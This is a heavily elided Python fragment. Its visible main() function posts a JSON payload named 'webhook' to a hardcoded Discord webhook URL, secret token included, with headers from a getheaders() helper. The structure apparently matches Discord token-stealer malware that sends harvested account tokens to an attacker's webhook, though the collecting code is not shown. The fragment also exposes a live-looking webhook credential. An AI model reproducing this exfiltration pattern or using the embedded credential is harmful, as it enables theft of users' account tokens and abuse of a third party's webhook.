...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/848530202086342697/pdbMzabEeVvb5_rY_uGJ3vQFbYrCYLVrV4srqfPW-ec89MHR4ReWlaaDB64wZZ2KBInX", data=dumps(webhook).encode(), headers=getheaders()))   
